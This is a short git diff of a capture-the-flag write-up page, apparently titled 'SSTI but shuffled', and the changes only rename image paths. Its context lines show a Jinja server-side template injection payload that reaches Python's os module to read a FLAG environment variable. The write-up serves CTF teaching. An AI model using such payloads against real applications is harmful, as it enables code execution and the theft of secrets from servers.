@@ -12,7 +12,7 @@ description: SSTI but shuffled
 
 <figure><img src="../../../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption><p>SHUFFLED PAYLOAD</p></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption><p>SHUFFLED PAYLOAD</p></figcaption></figure>
 
 Using the Error processing output as input activated the ssti
 
@@ -48,4 +48,4 @@ then we need to craft a payload to get the FLAG environment variable&#x20;
 
 `{{request.application.`**`globals`**`.`**`builtins`**`.`**`import`**`('os').getenv('FLAG')}}`
 
-<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption><p>FLAG</p></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption><p>FLAG</p></figcaption></figure>
